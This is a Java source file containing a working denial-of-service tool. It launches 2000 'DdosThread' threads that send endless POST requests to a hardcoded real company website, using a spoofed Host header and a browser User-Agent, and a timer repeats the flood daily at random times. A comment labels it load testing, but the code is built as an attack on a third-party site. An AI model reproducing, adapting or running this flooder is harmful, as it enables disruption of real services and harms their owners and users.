package com.serve.rec;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;

public final class ScheduleTask extends TimerTask {
	/*
	 * 	To provide target server URL
	 */
	public static final String TARGET = "https://www.prolifics.com/";
	/*
	 * variables to store random time for next day
	 */
	private final static long ONCE_PER_DAY = 1000 * 60 * 60 * 24;
	private final static int ONE_DAY = 0;
	private final static int HOURS_TIME = getRandomNumberInts(1, 24);
	private final static int MINUTES_TIME = getRandomNumberInts(1, 55);
	/*
	 *	Allows to create n no of threads from main method
	 *	and executes the thread when calls start
	 */
	public static class DdosThread extends Thread {

		private AtomicBoolean running = new AtomicBoolean(true);
		//private final String request = TARGET;  //commented as i'm using global URL
		private final URL url;

		String param = null;

		public DdosThread() throws Exception {
			url = new URL(TARGET);
			param = "param1=" + URLEncoder.encode("87845", "UTF-8");
		}

		@Override
		public void run() {
			System.out.println("doing task 2");
			while (running.get()) {
				try {
					attack();
				} catch (Exception e) {

				}

			}
			System.out.println("End of operation: 2");
		}
		/*
		 * sends request for server load testing
		 */
		public void attack() throws Exception {
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setDoOutput(true);
			connection.setDoInput(true);
			connection.setRequestMethod("POST");
			connection.setRequestProperty("charset", "utf-8");
			connection.setRequestProperty("Host", "localhost");
			connection.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
			connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			connection.setRequestProperty("Content-Length", param);
			System.out.println(this + " " + connection.getResponseCode());
			connection.getInputStream();
		}
	}

	/*
	 * getRandomNumberInts is used to return random number
	 */
	public static int getRandomNumberInts(int min, int max) {
		Random random = new Random();
		return random.ints(min, (max + 1)).findFirst().getAsInt();
	}

	public static void main(String... arguments) throws Exception {
		TimerTask fetchMail = new ScheduleTask();
		Timer timer = new Timer();
		timer.scheduleAtFixedRate(fetchMail, getTomorrowMorning4am(), ONCE_PER_DAY);
		for (int i = 0; i < 2000; i++) {
			DdosThread thread = new DdosThread();
			thread.start();
		}
		timer.scheduleAtFixedRate(fetchMail, getTomorrowMorning4am(), ONCE_PER_DAY);
	}

	@Override
	public void run() {
		System.out.println("doing task 1");
		for (int i = 0; i < 100; i++) {
			String output = getUrlContents(TARGET);
			System.out.println("Response from server:-" + output);
		}
		System.out.println("End of operation:1");
	}
	/*
	 * to return next scheduled time
	 */
	private static Date getTomorrowMorning4am() {
		Calendar tomorrow = new GregorianCalendar();
		tomorrow.add(Calendar.DATE, ONE_DAY);
		Calendar result = new GregorianCalendar(tomorrow.get(Calendar.YEAR), tomorrow.get(Calendar.MONTH),
				tomorrow.get(Calendar.DATE), HOURS_TIME, MINUTES_TIME);
		System.out.println(result.getTime());
		return result.getTime();
	}
	/*
	 * to print the response for the request
	 */
	private static String getUrlContents(String theUrl) {
		StringBuilder content = new StringBuilder();

		try {
			URL url = new URL(theUrl);
			URLConnection urlConnection = url.openConnection();

			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));

			String line;
			while ((line = bufferedReader.readLine()) != null) {
				content.append(line + "\n");
			}
			bufferedReader.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return content.toString();
	}
}